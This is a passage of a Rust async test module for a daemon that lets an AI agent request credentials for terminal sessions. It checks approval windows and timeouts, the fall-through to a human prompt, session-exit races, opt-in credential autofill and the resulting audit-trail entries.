        let clock = Clock::manual(std::time::Instant::now());
        let configured = DaemonConfig::default().binding_approval_timeout_secs;
        let server = server_full(
            keychain_mode(vec![b.clone()]),
            &sc.audit_log(),
            configured,
            clock.clone(),
        );
        let s = session_running("ssh", &["prod-01"], ECHO_OFF_FIXTURE);
        server.registry.insert(Arc::clone(&s)).expect("register");
        let mut client = attach_fake(&server, &s.id);
        await_prompt(&s, b"Password: ").await;

        // The two knobs, equal, both off the shipped defaults — and the
        // window they produce, as a *value*, before anything is driven.
        let default_timeout =
            Duration::from_secs(u64::from(crate::mcp::tools::DEFAULT_SECRET_TIMEOUT_SECS));
        assert_eq!(Duration::from_secs(configured), default_timeout);
        let window = crate::secret::approval_window(configured, Some(default_timeout));
        assert_eq!(
            window,
            default_timeout / 2,
            "with both knobs equal the halving is the only thing leaving room for \
             the fall-through"
        );

        // No `timeout_secs`: the default is what is under test.
        let call = spawn_call(
            &server,
            RequestSecretInputArgs {
                session: s.id.clone(),
                prompt_text: "a credential".into(),
                ..Default::default()
            },
        );
        let approval = await_approval(&server, &s.id).await;
        client
            .wait_for("BindingApprovalRequired", is_approval)
            .await;
        let started_at = clock.now_ms().max(0) as u64 / 1000;
        assert_eq!(
            approval.expires_at_unix_secs,
            started_at + window.as_secs(),
            "the recorded expiry is not half the caller's deadline"
        );

        for _ in 0..8 {
            tokio::task::yield_now().await;
        }
        // Nobody approves; the window elapses.
        clock.advance(window);

        // REQ-SEC-017's first clause: the fall-through is broadcast.
        client.wait_for("AwaitingSecret", is_awaiting).await;
        assert!(
            server.attach_hub().approvals().outstanding(&s.id).is_none(),
            "the window elapsed and the approval is still pending"
        );
        // And its second: the caller still has half its deadline left, so
        // a human can answer and the call returns a value.
        answer_as_a_human(&server, &s, b"typedbyahuman").await;
        let payload = joined(call, "the call on shipped defaults").await;
        assert_eq!(
            payload["status"], "secret_provided",
            "the approval consumed the caller's whole deadline, which is what the \
             halving exists to prevent: {payload}"
        );
        assert!(!sc.ran("prod-ssh"), "an expired approval ran the provider");
        let line = approval_line(&sc, &s.id).expect("a binding_approval line");
        assert_eq!(line["outcome"], "expired");

        client.unregister(&server);
        let _ = s.signal(Signal::Kill);
    }

    /// **Q10, and the arithmetic is asserted rather than only its
    /// consequence.**
    ///
    /// `timeout_secs: 10`, `binding_approval_timeout_secs: 120`, nobody
    /// approves. `min(120, 10 / 2)` is **5**, so on a manual clock
    /// `advance(4 s)` must leave the approval pending with no fall-through
    /// broadcast, and one more second must produce both.
    ///
    /// **Two mutations, and only the paired assertion sees both.**
    /// `min(configured, remaining)` without the halving gives a 10-second
    /// window: the fall-through fires exactly as the caller's deadline
    /// expires, so a consequence-only form can pass it on a fast machine.
    /// Using the configured window unconditionally gives 120 and makes
    /// REQ-SEC-017's fall-through unreachable whenever the two knobs are
    /// equal — i.e. by default. `min(configured, remaining)` is what §9.6
    /// said until rev. 48, so it is the mutation a reader of the stale
    /// side would write.
    #[tokio::test]
    async fn the_approval_window_leaves_time_for_the_fall_through() {
        let mut sc = Scratch::new("window");
        let b = confirming(&mut sc, "prod-ssh", SSH_PROD);
        let clock = Clock::manual(std::time::Instant::now());
        let server = server_full(
            keychain_mode(vec![b.clone()]),
            &sc.audit_log(),
            120,
            clock.clone(),
        );
        let s = session_running("ssh", &["prod-01"], ECHO_OFF_FIXTURE);
        server.registry.insert(Arc::clone(&s)).expect("register");
        let mut client = attach_fake(&server, &s.id);
        await_prompt(&s, b"Password: ").await;

        let call = spawn_call(&server, secret_args(&s.id, 10));
        let approval = await_approval(&server, &s.id).await;
        client
            .wait_for("BindingApprovalRequired", is_approval)
            .await;
        // The window as a *value*, before anything is driven: the record
        // says 5 seconds from the call's start, and a wrong arithmetic
        // shows up here as a wrong number rather than as a timing.
        assert_eq!(
            crate::secret::approval_window(120, Some(Duration::from_secs(10))),
            Duration::from_secs(5)
        );
        let started_at = clock.now_ms().max(0) as u64 / 1000;
        assert_eq!(
            approval.expires_at_unix_secs,
            started_at + 5,
            "the recorded expiry is not min(120, 10 / 2) seconds out"
        );

        for _ in 0..8 {
            tokio::task::yield_now().await;
        }
        clock.advance(Duration::from_secs(4));
        // Give a wrongly-woken waiter every chance to act before this is
        // asserted, or the row passes by being faster than the bug.
        tokio::time::sleep(Duration::from_millis(200)).await;
        client.drain();
        assert!(
            server.attach_hub().approvals().outstanding(&s.id).is_some(),
            "the approval expired four seconds into a five-second window"
        );
        assert!(
            !client.has(is_awaiting),
            "the fall-through fired early; the client saw {:?}",
            client.seen
        );

        clock.advance(Duration::from_secs(1));
        client.wait_for("AwaitingSecret", is_awaiting).await;
        assert!(
            server.attach_hub().approvals().outstanding(&s.id).is_none(),
            "the window elapsed and the approval is still pending"
        );

        // And the caller still has time to be answered: the whole point
        // of halving is that the prompt path inherits a usable deadline.
        answer_as_a_human(&server, &s, b"typedbyahuman").await;
        let payload = joined(call, "the call after the window").await;
        assert_eq!(
            payload["status"], "secret_provided",
            "the fall-through ran but the caller's deadline had already gone: {payload}"
        );

        client.unregister(&server);
        let _ = s.signal(Signal::Kill);
    }

    /// **An approval taken away without a decision falls through — it
    /// does not abort the call.**
    ///
    /// §17.5's `Superseded` has two triggers and only one of them is
    /// reachable from this milestone's own code (the child exiting,
    /// covered by the row below). The other — *"the outstanding
    /// `request_secret_input` is cancelled"*, and more generally anything
    /// that clears the slot without deciding — arrives from **outside**
    /// the waiting caller, and **Task 13's hand-off is exactly that**:
    /// `attach::conn`'s `forward_events` calling `approvals().supersede`
    /// for the caller-less `autofill_on_echo_off` path. So the third party
    /// here is not a contrivance; it is the next-but-one milestone's
    /// design, driven a task early.
    ///
    /// **The defect this pins is a panic, not a wrong answer.** Dropping
    /// the sender completes the caller's `oneshot` *inside* its own
    /// `select!`, and a second read of a completed `oneshot` is
    /// `panic!("called after complete")` in tokio — so the arm documented
    /// as handling a lost approval defensively killed the tool-call task
    /// instead of answering it. The loop below fails **fast and with the
    /// panic's own text** rather than letting the frame waits time out
    /// and report only that their frame never came.
    ///
    /// **The answer here is the human prompt, and that is a choice rather
    /// than a requirement.** REQ-SEC-017 requires the fall-through for
    /// *"denied or expired"* and names no third state; §17.5's
    /// `Superseded` row says only *"approval discarded; no injection"*,
    /// which is a **prohibition and not a destination**. The choice is
    /// argued at `run_binding_approval` and flagged in the report; what
    /// this row pins is that the choice is made **on the session's
    /// liveness** — the child is alive here, and the row asserts it — and
    /// not on which `select!` branch happened to wake.
    /// `an_exit_that_races_the_supersede_answers_the_same_way` is the
    /// other side of that, and `mcp::tools::tests::a_lost_approval_is_classified_by_the_session_and_not_by_the_wake`
    /// is the rule itself.
    #[tokio::test]
    async fn an_approval_taken_away_without_a_decision_falls_through_rather_than_panicking() {
        let mut sc = Scratch::new("discarded");
        let b = confirming(&mut sc, "prod-ssh", SSH_PROD);
        let server = server_with(keychain_mode(vec![b.clone()]), &sc.audit_log());
        // **A child that reads twice, and the liveness assertion below is
        // why.** With one read the human's answer *completes* the child,
        // which then prints and exits — so `s.is_alive()` afterwards races
        // the exit and the row fails on its own "spoiled the row" message
        // for a reason that has nothing to do with what it is about.
        // Measured on the full library target: **1 failure in 12 runs**
        // before Task 12's rows existed, **5 in 12** after they did, which
        // is a pre-existing race whose rate rose with ambient load rather
        // than a defect Task 12 introduced. With two reads the child is
        // provably parked on the second when the assertion runs, so the
        // claim — the classification was taken against a **live** session
        // — is arranged rather than hoped for. The two-read spelling is
        // this file's existing idiom (`a_human_answering_…` and two others
        // concatenate the fixture the same way), so GC14 is untouched.
        let two_reads = format!("{ECHO_OFF_FIXTURE}; {ECHO_OFF_FIXTURE}");
        let s = session_running("ssh", &["prod-01"], &two_reads);
        server.registry.insert(Arc::clone(&s)).expect("register");
        let mut client = attach_fake(&server, &s.id);
        await_prompt(&s, b"Password: ").await;

        let mut call = spawn_call(&server, secret_args(&s.id, 20));
        await_approval(&server, &s.id).await;
        client
            .wait_for("BindingApprovalRequired", is_approval)
            .await;

        // The third party, exactly as Task 13 will call it.
        assert!(
            server.attach_hub().approvals().supersede(&s.id).is_some(),
            "the approval was not there to take"
        );

        // Fail fast, and with the real reason: under the defect the task
        // is already gone with a `JoinError::Panic`, and every wait below
        // would otherwise report only that its own frame never arrived.
        let mut died = false;
        let deadline = tokio::time::Instant::now() + Duration::from_secs(20);
        while !server.attach_hub().secrets().has_waiter(&s.id) {
            if call.is_finished() {
                died = true;
                break;
            }
            assert!(
                tokio::time::Instant::now() < deadline,
                "the call never fell through to the prompt path"
            );
            tokio::time::sleep(Duration::from_millis(10)).await;
        }
        if died {
            let ended = (&mut call).await;
            panic!("the call ended instead of falling through to the human prompt: {ended:?}");
        }

        client.wait_for("AwaitingSecret", is_awaiting).await;
        answer_as_a_human(&server, &s, b"typedbyahuman").await;
        let payload = joined(call, "the discarded-approval call").await;
        assert_eq!(
            payload["status"], "secret_provided",
            "a lost approval must fall through to the human prompt: {payload}"
        );

        // The child is alive, so `session_died` would have been a claim
        // about a running process — this is the half that separates
        // `Discarded` from `SessionExited`.
        // The child has consumed the human's answer and is parked on its
        // second read, so this is a fact about the arrangement rather than
        // a race with the child's exit.
        buffer_until(&s, b"got=TYPEDBYAHUMAN", 20).await;
        assert!(s.is_alive(), "the fixture's child died and spoiled the row");
        assert!(
            !sc.ran("prod-ssh"),
            "an approval nobody granted still read the credential store"
        );
        assert_eq!(
            approval_line(&sc, &s.id),
            None,
            "§9.4's `outcome` has no value for `Superseded`, so no line is written (Q13)"
        );

        client.unregister(&server);
        let _ = s.signal(Signal::Kill);
    }

    /// **One event, one answer: a session exit that races the supersede
    /// must not depend on which `select!` branch wakes.**
    ///
    /// This is the case Task 13 creates and nothing in this milestone
    /// can. `BindingApprovals::supersede`'s own doc says its caller
    /// *"arrives from the session… a child that has exited supersedes
    /// whatever is pending on it"*, and Task 13's sweep lands in
    /// `attach::conn::forward_events`' **`Exited`** arm — so the third
    /// party that drops the sender **is itself a session exit**. Both the
    /// `rx` branch (as `Err`) and the `exit` branch then become ready on
    /// one event, and `tokio::select!` chooses between ready branches at
    /// **random**.
    ///
    /// Classifying on the wake would make that one event produce two
    /// answers, and the wrong one raises a secret request, writes a
    /// `secret_input_request` line and broadcasts an `AwaitingSecret` to
    /// every attached human — for a child that is already gone. So the
    /// assertions below are not only about the tool's status: **no
    /// request may be raised at all.**
    ///
    /// **Why it repeats.** The branch is the runtime's to pick, so a
    /// single pass proves one of the two. Twelve passes make covering
    /// both overwhelmingly likely, and the two assertions that would
    /// separate them are made on every pass. The *deterministic* statement
    /// of the same rule is
    /// `mcp::tools::tests::a_lost_approval_is_classified_by_the_session_and_not_by_the_wake`,
    /// and the structural one is that `lost_approval` has no parameter a
    /// wake cause could enter through.
    ///
    /// A **quiet** child, because this row is about what is *not*
    /// broadcast: a fixture that printed would put `Output` frames in the
    /// client's queue for no reason, and the echo-off prompt this file's
    /// other rows need plays no part here (the binding carries no
    /// `match_prompt`).
    #[tokio::test]
    async fn an_exit_that_races_the_supersede_answers_the_same_way() {
        let mut sc = Scratch::new("exitrace");
        let b = confirming(&mut sc, "prod-ssh", SSH_PROD);
        let server = server_with(keychain_mode(vec![b.clone()]), &sc.audit_log());

        for pass in 1..=12 {
            let s = session_running("ssh", &["prod-01"], "sleep 30");
            server.registry.insert(Arc::clone(&s)).expect("register");
            let mut client = attach_fake(&server, &s.id);

            let call = spawn_call(&server, secret_args(&s.id, 20));
            await_approval(&server, &s.id).await;
            client
                .wait_for("BindingApprovalRequired", is_approval)
                .await;

            // **No `.await` from here to the supersede, and that is what
            // makes the race arranged rather than hoped for.**
            // `#[tokio::test]` is a *current-thread* runtime, so the
            // spawned call task runs only when this one yields. Blocking
            // the runtime while the child dies therefore guarantees the
            // task has **not** been polled since the death, and the
            // supersede lands with the select still armed — which is the
            // ordering Task 13's sweep produces and the one that lets the
            // `rx` branch win at all.
            //
            // Measured, and this is why it is spelled this way: with a
            // `tokio::time::sleep` in this loop the task is polled the
            // instant the child dies, the `exit` branch wins every time
            // on an idle machine, and the row went green against the
            // wake-cause classification in 5 isolated runs while
            // reddening under a loaded full-workspace run. A guard that
            // only fires when the box is busy is not a guard.
            let _ = s.signal(Signal::Kill);
            let deadline = std::time::Instant::now() + Duration::from_secs(20);
            while s.is_alive() {
                assert!(
                    std::time::Instant::now() < deadline,
                    "pass {pass}: the child never died"
                );
                std::thread::sleep(Duration::from_millis(2));
            }
            // Task 13's sweep, in one line, with the session already dead.
            server.attach_hub().approvals().supersede(&s.id);

            let payload = joined(call, "the raced call").await;
            assert_eq!(
                payload["status"], "session_died",
                "pass {pass}: one event answered two ways — the classification followed \
                 the `select!` branch rather than the session: {payload}"
            );

            // **The half that a status-only assertion misses.** The
            // fall-through's damage is not to the agent's answer — that
            // comes out `session_died` either way, because `await_secret`
            // returns at once for a dead session — it is the request
            // raised against a corpse: an affordance broadcast to every
            // attached human, and a `secret_input_request` line in the
            // trail.
            client.drain();
            assert!(
                !client.has(is_awaiting),
                "pass {pass}: an AwaitingSecret was broadcast for a child that was \
                 already gone: {:?}",
                client.seen
            );
            let kinds = sc.kinds(&s.id);
            assert!(
                !kinds.iter().any(|k| k == "secret_input_request"),
                "pass {pass}: a request was raised against a dead session: {kinds:?}"
            );
            assert!(
                !kinds.iter().any(|k| k == "binding_approval"),
                "pass {pass}: §9.4's `outcome` has no value for `Superseded` (Q13): {kinds:?}"
            );
            assert!(
                !sc.ran("prod-ssh"),
                "pass {pass}: an approval nobody granted read the credential store"
            );

            client.unregister(&server);
        }
    }

    /// **`timeout_secs` bounds the whole call, approval included.**
    ///
    /// §5.2's rule is that the window starts at *this call*. It does not
    /// say "at each stage of this call", and §17.5 put a stage in front of
    /// the prompt path: an approval may consume up to half of
    /// `timeout_secs`, so a prompt deadline recomputed as
    /// `now + timeout_secs` after it is a **second full window laid end to
    /// end with the first** — a `require_confirm` call running for 1.5×
    /// the number the agent declared.
    ///
    /// Driven on `Clock::manual()` against the **hand**, which is what
    /// makes it a statement about the deadline's origin rather than about
    /// how fast the machine is: `timeout_secs: 10`, so the approval window
    /// is `min(120, 10 / 2)` = 5. Five seconds burn the approval, five
    /// more reach the caller's own deadline, and the call must be **over**
    /// at that hand position. Under the recomputation the prompt deadline
    /// is `call_start + 15` and the call is still parked.
    ///
    /// The anti-vacuity half is the assertion **between** the two
    /// advances: the call is still running after the approval expired, so
    /// the row cannot pass against an implementation that simply gives up
    /// at the approval.
    #[tokio::test]
    async fn the_callers_timeout_bounds_the_approval_and_the_prompt_together() {
        let mut sc = Scratch::new("endtoend");
        let b = confirming(&mut sc, "prod-ssh", SSH_PROD);
        let clock = Clock::manual(std::time::Instant::now());
        let server = server_full(
            keychain_mode(vec![b.clone()]),
            &sc.audit_log(),
            120,
            clock.clone(),
        );
        let s = session_running("ssh", &["prod-01"], ECHO_OFF_FIXTURE);
        server.registry.insert(Arc::clone(&s)).expect("register");
        let mut client = attach_fake(&server, &s.id);
        await_prompt(&s, b"Password: ").await;

        let call = spawn_call(&server, secret_args(&s.id, 10));
        await_approval(&server, &s.id).await;
        client
            .wait_for("BindingApprovalRequired", is_approval)
            .await;

        // Five seconds: the whole approval window, and nobody decides.
        for _ in 0..8 {
            tokio::task::yield_now().await;
        }
        clock.advance(Duration::from_secs(5));
        client.wait_for("AwaitingSecret", is_awaiting).await;
        assert!(
            !call.is_finished(),
            "the call ended at the approval's expiry instead of falling through, so the \
             assertion below would be about nothing"
        );

        // Five more: the caller's own deadline, measured from the call and
        // not from the fall-through. Nobody answers the prompt either.
        for _ in 0..8 {
            tokio::task::yield_now().await;
        }
        clock.advance(Duration::from_secs(5));

        let payload = tokio::time::timeout(Duration::from_secs(10), call)
            .await
            .expect(
                "the call was still waiting at `call_start + timeout_secs`: its prompt \
                 deadline was recomputed after the approval rather than derived from the \
                 call, so the caller's timeout_secs is not an end-to-end bound",
            )
            .expect("the call");
        assert_eq!(payload["status"], "secret_cancelled", "{payload}");
        assert_eq!(payload["data"]["reason"], "timeout", "{payload}");

        client.unregister(&server);
        let _ = s.signal(Signal::Kill);
    }

    /// §17.5's `Superseded`: the session exits with an approval pending,
    /// and a decision arriving **afterwards** resolves nothing.
    ///
    /// Resolving on a late decision would inject a credential into a PTY
    /// nothing is reading. And per **Q13** no `binding_approval` line is
    /// written at all — §9.4's vocabulary has no value for this state, and
    /// an absent record beats an invented `outcome`.
    ///
    /// **The pairing is in the same row**: an identical arrangement on a
    /// live session approves, spawns the provider and injects — so the
    /// negative is about supersession and not about a fixture that never
    /// worked.
    #[tokio::test]
    async fn a_session_exit_supersedes_a_pending_approval() {
        let mut sc = Scratch::new("supersede");
        let dead_b = confirming(&mut sc, "killed", SSH_PROD);
        let live_b = confirming(&mut sc, "alive", "^psql\\s+-h\\s+prod$");
        let server = server_with(
            keychain_mode(vec![dead_b.clone(), live_b.clone()]),
            &sc.audit_log(),
        );

        // ---- the negative: the child dies while the approval is pending
        let dead = session_running("ssh", &["prod-01"], ECHO_OFF_FIXTURE);
        server.registry.insert(Arc::clone(&dead)).expect("register");
        let mut client = attach_fake(&server, &dead.id);
        await_prompt(&dead, b"Password: ").await;

        let call = spawn_call(&server, secret_args(&dead.id, 20));
        let approval = await_approval(&server, &dead.id).await;
        client
            .wait_for("BindingApprovalRequired", is_approval)
            .await;

        let _ = dead.signal(Signal::Kill);
        let payload = joined(call, "the superseded call").await;
        assert_eq!(
            payload["status"], "session_died",
            "a session that exited under a pending approval answers §5.1's status, not a \
             prompt for a child that is gone: {payload}"
        );

        // The decision arrives too late and finds nothing to apply.
        assert_eq!(
            decide(
                &server,
                &dead.id,
                &approval.approval_id,
                ApprovalDecision::Approve,
                "cli"
            ),
            crate::secret::Decide::UnknownApprovalId
        );
        tokio::time::sleep(Duration::from_millis(200)).await;
        assert!(
            !sc.ran("killed"),
            "a decision that arrived after the session was gone still ran the provider"
        );
        assert_eq!(
            approval_line(&sc, &dead.id),
            None,
            "§9.4's `outcome` has no value for `Superseded`, so no line is written (Q13)"
        );
        client.unregister(&server);

        // ---- the pairing: the identical arrangement, nothing killed
        let live = session_running("psql", &["-h", "prod"], ECHO_OFF_FIXTURE);
        server.registry.insert(Arc::clone(&live)).expect("register");
        let mut client = attach_fake(&server, &live.id);
        await_prompt(&live, b"Password: ").await;

        let call = spawn_call(&server, secret_args(&live.id, 20));
        let approval = await_approval(&server, &live.id).await;
        client
            .wait_for("BindingApprovalRequired", is_approval)
            .await;
        assert_eq!(
            decide(
                &server,
                &live.id,
                &approval.approval_id,
                ApprovalDecision::Approve,
                "cli"
            ),
            crate::secret::Decide::Recorded
        );
        let payload = joined(call, "the live call").await;
        assert_eq!(payload["status"], "secret_provided", "{payload}");
        assert!(sc.ran("alive"), "the pairing's provider never ran");
        buffer_until(&live, b"got=HUNTER2", 20).await;
        assert_eq!(
            approval_line(&sc, &live.id).expect("the pairing writes a line")["outcome"],
            "approved"
        );

        client.unregister(&server);
        let _ = live.signal(Signal::Kill);
    }

    // ------------------------------- §9.6's `autofill_on_echo_off` (Task 12)
    //
    // One boolean, and the most consequential one in the system. The
    // §8.3 echo drop is an **edge**, so every row below arms the listener
    // and *then* releases the child — see [`gated_echo_off`].

    /// [`ECHO_OFF_FIXTURE`] held at the starting line until the row opens
    /// a gate file.
    ///
    /// **The echo drop is an edge, and `session_running` returns with the
    /// child already executing.** A listener armed after that edge has
    /// fired sees nothing, so a row that armed and then hoped would be
    /// load-dependent in exactly the direction that hides the defect: the
    /// negative rows would pass because the listener missed the edge
    /// rather than because the flag was off. Gating makes "the listener
    /// was armed first" an arrangement rather than a wish.
    ///
    /// A **prefix**, not a re-spelling: GC14's one fixture is unchanged
    /// and appears verbatim, in the same way the two-read rows above
    /// concatenate it.
    fn gated_echo_off(gate: &Path) -> String {
        format!(
            "until [ -f '{}' ]; do sleep 1; done; {ECHO_OFF_FIXTURE}",
            gate.display()
        )
    }

    /// `send_input` as an agent makes it — the non-slot route §5.2 permits
    /// during `AwaitingSecret` (REQ-SEC-011), with its warning.
    async fn call_send_input(server: &HoldfastServer, session: &str, data: &str) -> Value {
        let r = tokio::time::timeout(
            Duration::from_secs(30),
            server.send_input(Parameters(crate::mcp::tools::SendInputArgs {
                session: session.to_string(),
                data: data.to_string(),
                ..Default::default()
            })),
        )
        .await
        .expect("send_input never returned")
        .expect("send_input");
        body(&r)
    }

    /// Poll until an audit line of `kind` exists for this session.
    async fn await_audit_kind(sc: &Scratch, session_id: &str, kind: &str) {
        let deadline = tokio::time::Instant::now() + Duration::from_secs(20);
        while !sc.kinds(session_id).iter().any(|k| k == kind) {
            assert!(
                tokio::time::Instant::now() < deadline,
                "no `{kind}` line was ever written for {session_id}"
            );
            tokio::time::sleep(Duration::from_millis(20)).await;
        }
    }

    /// `[security]` with the keychain step on **and §9.6's autofill knob
    /// set explicitly**.
    fn autofill_mode(bindings: Vec<SecretBinding>, on: bool) -> SecurityConfig {
        SecurityConfig {
            autofill_on_echo_off: on,
            ..keychain_mode(bindings)
        }
    }

    /// Everything an autofill row needs: a session, its listener armed,
    /// the echo-drop raise a connection would have made, and the child
    /// released.
    ///
    /// The raise is arranged **before** the gate opens so that every row
    /// measures the autofill rather than racing `forward_events`' raise —
    /// it is the same two lines that arm names in `attach::conn`, and
    /// there is no connection here to run them.
    async fn armed_session(
        server: &HoldfastServer,
        gate: &Path,
        command: &str,
        args: &[&str],
    ) -> (Arc<Session>, crate::attach::secret::SecretRequest) {
        let s = session_running(command, args, &gated_echo_off(gate));
        server.registry.insert(Arc::clone(&s)).expect("register");
        server.watch_for_autofill(&s);
        let (raised, first) = server.attach_hub().raise_secret(&s.id, "Password: ");
        assert!(first, "the row, not something else, raised this request");
        std::fs::write(gate, b"go").expect("open the gate");
        await_prompt(&s, b"Password: ").await;
        (s, raised)
    }

    /// **REQ-SEC-014, behaviourally.** With `autofill_on_echo_off` unset,
    /// an echo drop does what 0.0.6 built and nothing more.
    ///
    /// Task 1 asserts the config default. That assertion passes perfectly
    /// against code that never reads the field, which is why this row
    /// exists: `secret_provider = "both"`, a binding that matches, a
    /// provider script that works, and the knob left at whatever
    /// `SecurityConfig::default()` says — and the child stays blocked.
    ///
    /// **The enabled twin runs in this row and is its clock.** A negative
    /// about something that did not happen needs a bound on how long it
    /// was given to happen, and a fixed sleep is a load-dependent guess.
    /// The twin session, on the same fixtures with the same provider,
    /// completes the whole round trip — provider, PTY write, the child's
    /// own transform — and only then are the disabled session's
    /// assertions made. If the flag were ignored, the disabled session had
    /// at least as long as the twin took.
    #[tokio::test]
    async fn autofill_is_off_by_default() {
        let mut sc = Scratch::new("offbydefault");
        let off_binding = sc.binding("off", SSH_PROD, &format!("printf '{PROBE}\\n'\n"));
        let on_binding = sc.binding("on", SSH_PROD, &format!("printf '{PROBE}\\n'\n"));

        // `both`, which §5.2 says lets step 1 run — so the mode is not
        // what stops this.
        let mut sec = keychain_mode(vec![off_binding]);
        sec.secret_provider = "both".to_string();
        assert!(
            !sec.autofill_on_echo_off,
            "REQ-SEC-014: the knob must be off with nothing set, or this row is \
             asserting a value it set itself"
        );
        let off_server = server_with(sec, &sc.audit_log());

        let mut on_sec = autofill_mode(vec![on_binding], true);
        on_sec.secret_provider = "both".to_string();
        let on_server = server_with(on_sec, &sc.audit_log());

        let off_gate = sc.path("off.gate");
        let on_gate = sc.path("on.gate");
        let (off, off_raised) = armed_session(&off_server, &off_gate, "ssh", &["prod-01"]).await;
        let (on, _) = armed_session(&on_server, &on_gate, "ssh", &["prod-01"]).await;

        // The clock: the enabled twin goes all the way through.
        buffer_until(&on, b"got=HUNTER2", 20).await;
        assert!(sc.ran("on"), "the twin's provider never ran");

        // And with the knob unset, none of it happened.
        assert!(
            !sc.ran("off"),
            "a provider process was spawned with `autofill_on_echo_off` unset — \
             silent credential injection is opt-in per deployment (REQ-SEC-014)"
        );
        let seen = buffered(&off);
        assert!(
            !contains(&seen, b"got="),
            "the child completed its read, so something was written to it:\n{}",
            String::from_utf8_lossy(&seen)
        );
        assert!(
            off.is_awaiting_secret(),
            "the child is no longer blocked at its echo-off prompt"
        );
        assert!(
            off_server
                .attach_hub()
                .secrets()
                .matches_outstanding(&off.id, &off_raised.request_id),
            "the request was closed by something on a row where nothing should \
             have answered it"
        );
        assert!(
            !sc.kinds(&off.id).iter().any(|k| k == "binding_resolved"),
            "a binding resolved with the knob unset: {:?}",
            sc.kinds(&off.id)
        );

        let _ = off.signal(Signal::Kill);
        let _ = on.signal(Signal::Kill);
    }

    /// **The pairing.** With the knob on, the daemon resolves and injects
    /// on the edge and **no MCP tool call happens at all**.
    ///
    /// §16.4's closing note: *"steps 4–7 collapse: the daemon resolves and
    /// injects at step 3 and the agent never makes a secret-related call
    /// at all."* This row calls no tool — not `start_session`, not
    /// `request_secret_input` — and the child still prints the digest.
    /// Without it, a flag that is read and never acted on passes the row
    /// above perfectly.
    ///
    /// The raise the daemon found is closed `fulfilled`, which is what an
    /// attached human sees happen to the modal in front of them.
    #[tokio::test]
    async fn autofill_injects_when_it_is_enabled() {
        let mut sc = Scratch::new("enabled");
        let b = sc.binding("prod-ssh", SSH_PROD, &format!("printf '{PROBE}\\n'\n"));
        let mut sec = autofill_mode(vec![b], true);
        sec.secret_provider = "both".to_string();
        let server = server_with(sec, &sc.audit_log());

        let gate = sc.path("gate");
        let s = session_running("ssh", &["prod-01"], &gated_echo_off(&gate));
        server.registry.insert(Arc::clone(&s)).expect("register");
        server.watch_for_autofill(&s);
        let mut client = attach_fake(&server, &s.id);
        let (raised, first) = server.attach_hub().raise_secret(&s.id, "Password: ");
        assert!(first);
        std::fs::write(&gate, b"go").expect("open the gate");
        await_prompt(&s, b"Password: ").await;

        let seen = buffer_until(&s, b"got=HUNTER2", 20).await;
        assert!(sc.ran("prod-ssh"), "the binding's provider never ran");
        assert!(
            !contains(&seen, PROBE.as_bytes()),
            "the resolved value reached the ring buffer: {}",
            String::from_utf8_lossy(&seen)
        );

        // §7.5's closure, which is what a human at an attached client sees
        // happen to the modal in front of them.
        let closed = client
            .wait_for("SecretRequestClosed", |f| {
                matches!(f, ServerFrame::SecretRequestClosed { .. })
            })
            .await;
        let ServerFrame::SecretRequestClosed {
            request_id,
            outcome,
        } = closed
        else {
            panic!("wait_for returned the wrong frame");
        };
        assert_eq!(request_id, raised.request_id);
        assert_eq!(outcome, "fulfilled");
        assert!(
            server.attach_hub().outstanding_secret(&s.id).is_none(),
            "the raise the autofill satisfied is still outstanding"
        );

        client.unregister(&server);
        let _ = s.signal(Signal::Kill);
    }

    /// **The audit consequence, and it is easy to get wrong.**
    ///
    /// An autofilled request produces a `binding_resolved` entry and
    /// **no** `secret_input_request` / `secret_input_resolved` entries.
    /// Those two are written **per tool call** (§5.2, Task 6's rule) and
    /// there was no tool call — writing them would make the trail claim an
    /// agent asked for something it never asked for, which is worse than a
    /// gap because an operator reading it has no way to tell.
    ///
    /// **The anti-vacuity pairing is the whole trail**, asserted as an
    /// exact list rather than as three absences: an implementation that
    /// wrote nothing at all satisfies "no `secret_input_request`", and
    /// `server_with` has already established that the log is open.
    #[tokio::test]
    async fn autofill_writes_binding_resolved_and_no_tool_audit_lines() {
        let mut sc = Scratch::new("autofillaudit");
        let b = sc.binding("prod-ssh", SSH_PROD, &format!("printf '{PROBE}\\n'\n"));
        let server = server_with(autofill_mode(vec![b], true), &sc.audit_log());

        let gate = sc.path("gate");
        let (s, _) = armed_session(&server, &gate, "ssh", &["prod-01"]).await;
        buffer_until(&s, b"got=HUNTER2", 20).await;

        let kinds = sc.kinds(&s.id);
        assert_eq!(
            kinds,
            vec!["binding_resolved".to_string()],
            "an autofill with no tool call wrote something other than exactly one \
             `binding_resolved`: {kinds:?}"
        );
        let entry = sc
            .audit(&s.id)
            .into_iter()
            .find(|e| e["kind"] == "binding_resolved")
            .expect("the entry the list above says is there");
        assert_eq!(entry["binding_name"], sc.name("prod-ssh"));
        assert_eq!(entry["use_count"], 1);
        // The reference never reaches the trail, and neither does the
        // value — with the control that says so is this module's doing.
        let trail = sc.audit_text();
        assert!(
            !trail.contains(REFERENCE) && !trail.contains(PROBE),
            "the reference or the value reached the audit trail"
        );
        let rules = &server.processor.rules;
        assert_eq!(crate::output::redact::redact_str(rules, PROBE), PROBE);
        assert_eq!(
            crate::output::redact::redact_str(rules, REFERENCE),
            REFERENCE
        );

        let _ = s.signal(Signal::Kill);
    }

    /// The knob does not override §5.2's mode gate, and it does not
    /// override the binding match.
    ///
    /// Both `keychain` and `both` let step 1 run, so both inject. **The
    /// pairing is a binding negative and not a restatement of Task 1**:
    /// `autofill_on_echo_off = true` with `secret_provider = "prompt"` is
    /// rejected at config load by Task 1's second validation rule, so the
    /// runtime mode check is defence in depth whose only reachable proof
    /// is that config test — a clause about it here would assert nothing
    /// about autofill. What *is* reachable, and what this row drives, is a
    /// session whose command line matches no binding: no provider process,
    /// no injection, and the child left blocked exactly as §8.3 found it.
    ///
    /// **The matching session is the negative's clock**, on the same
    /// server, the same config and the same listener — so "no provider
    /// ran" is bounded by an autofill that provably completed rather than
    /// by a sleep.
    #[tokio::test]
    async fn autofill_respects_the_provider_mode() {
        for mode in ["keychain", "both"] {
            let mut sc = Scratch::new(&format!("mode-{mode}"));
            let b = sc.binding(
                "prod-ssh",
                "^ssh\\s+(\\S+@)?prod-0[12]\\b",
                &format!("printf '{PROBE}\\n'\n"),
            );
            let mut sec = autofill_mode(vec![b], true);
            sec.secret_provider = mode.to_string();
            let server = server_with(sec, &sc.audit_log());

            // The negative first, so it has been armed and released for at
            // least as long as the positive takes.
            let miss_gate = sc.path("miss.gate");
            let (miss, miss_raised) =
                armed_session(&server, &miss_gate, "ssh", &["user@staging"]).await;
            let hit_gate = sc.path("hit.gate");
